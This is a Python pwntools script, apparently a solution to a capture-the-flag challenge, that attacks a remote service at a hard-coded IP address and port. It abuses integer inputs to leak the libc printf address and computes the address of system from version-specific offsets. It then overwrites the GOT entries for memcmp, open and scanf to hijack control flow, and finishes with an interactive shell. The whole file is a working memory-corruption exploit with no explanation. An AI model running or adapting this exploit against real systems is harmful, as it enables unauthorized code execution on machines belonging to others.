from pwn import *

sock = remote('128.199.135.210', 31335)

def r(n):
    global sock
    for i in range(n):
        print sock.readline()[:-1]

def g():
    global sock
    r = sock.readline()
    print r[:-1]
    return r

num = 121

r(1)
sock.sendline('a\n')
r(1)
sock.sendline('-2147418112\n')
r(2)

sock.sendline(str(num) + '\n')
r(1)

for i in range(num):
    sock.sendline('1\n')

print('--> sent numbers')

r(1)
sock.sendline('-1\n')
r(1)
sock.sendline('24\n')
r(5)

print('--> editing...')

for i in range(25):
    r(2)
    sock.sendline('\n')

r(2)

l = g()
r(1)

printf = int(l[13:])
# system = printf - 59600 # xenial
system = printf - 61200 # yakkety

print('--> SYSTEM @ ' + hex(system))

sock.sendline('\n')
r(2)

print('--> overwrite memcmp')

# overwrite memcmp@GOT with system
sock.sendline('y\n')
r(1)
sock.sendline(str(system) + '\n')

print('--> done')

r(2)

r(2)
sock.sendline('\n')


# xenial
# gadget = 0x0002c79c
# gadget_fix = printf - 300656 + gadget

# yakkety
gadget = 0x0002c92c
gadget_fix = printf - 302896 + gadget

# overwrite open@GOT with a gadget to xor eax
sock.sendline('y\n')
r(1)
sock.sendline(str(gadget_fix) + '\n')

r(2)
r(2)
sock.sendline('\n')

r(4)

# overwrite __isoc99_scanf@GOT with adress in <login>
sock.sendline('y\n')
r(1)
#sock.sendline('134514153\n')
sock.sendline('134514132\n')

r(2)
r(2)

sock.interactive()
